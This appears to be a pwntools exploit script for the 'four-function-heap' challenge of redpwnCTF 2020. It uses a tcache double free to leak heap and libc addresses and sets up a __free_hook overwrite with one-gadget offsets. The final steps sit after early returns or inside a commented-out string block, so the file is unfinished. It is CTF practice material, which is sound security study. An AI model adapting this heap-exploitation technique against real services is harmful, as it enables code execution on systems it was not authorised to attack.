#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./four-function-heap"
LIBCNAME = "./libc.so.6"

hosts = ("2020.redpwnc.tf","localhost","localhost")
ports = (31774,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

count = 0

def hoge(ix):
    global count
    count += 1
    print("count: "+hex(count))
    c.recvuntil("{{prompts.menu}}: ")
    c.sendline(str(ix))

def alloc(size,content):
    hoge(1)
    c.recvuntil("index}}: ")
    c.sendline(str(0))
    c.recvuntil("size}}: ")
    c.sendline(str(size))
    c.recvuntil("read}}: ")
    c.send(content)

def free():
    hoge(2)
    c.recvuntil("index}}: ")
    c.sendline(str(0))

def show():
    hoge(3)
    c.recvuntil("index}}: ")
    c.sendline(str(0))

## exploit ###########################################

def exploit():
  global c
  ssize = 0x30
  msize = 0x50
  lsize = 0x100
  unsortedsize = 0x500
  ogs = [0x4f2c5,0x4f322,0x10a38c]


  alloc(0x400,"A"*0x20+p64(0)+p64(0x461)+p64(0xdeadbeef))
  free()
  free()
  show()
  heapbase = unpack(c.recvline().rstrip().ljust(8,'\x00')) - 0x260
  print("[+] heapbase: "+hex(heapbase))

  alloc(0x400,p64(heapbase+0x290)+p64(0)+"A"*0x10+p64(0)+p64(0x461)+p64(heapbase+0x2a0)+p64(0x411)+p64(heapbase+0x2a0))
  alloc(0x400,p64(heapbase+0x2a0)*5)  
  alloc(0x200,(p64(0)+p64(0x21))*0xa)   # fake header

  alloc(0x400,p64(heapbase+0x2a0)) # tcacheにあったやつ
  free()
  show()
  libcbase = unpack(c.recvline().rstrip().ljust(8,'\x00')) - 0x3ebca0
  print("[+] libcbase: "+hex(libcbase))
  return

  alloc(0x400,p64(heapbase+0x2a0)+p64(0x411)+p64(libcbase + libc.symbols["__free_hook"]))
  return
  free()
  raw_input("OK")
  alloc(0x400,"A"*8)


  return
  '''
  alloc(ssize,"A"*8)
  free()
  free()
  show()
  heapbase = unpack(c.recvline().rstrip().ljust(8,'\x00')) - 0x260
  print("[+] heapbase: "+hex(heapbase))

  alloc(unsortedsize,p64(heapbase+0x260)) # unsortedに繋ぐよう

  alloc(ssize,p64(heapbase + 0x2a0)) # tcache[ssize] -> unsortedsize

  alloc(ssize,p64(heapbase+0x260))
  alloc(lsize,"F"*0x8)
  alloc(ssize,"E"*0x8) # tcacheに繋がってたunsortedsize
  free()                # unsorted
  show()
  libcbase = unpack(c.recvline().rstrip().ljust(8,'\x00')) - 0x3ebca0
  print("[+] libcbase: "+hex(libcbase))

  alloc(ssize,p64(libcbase+libc.symbols["__free_hook"]))
  raw_input("OK")
  alloc(ssize,p64(libcbase+ogs[0]))
  '''

## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
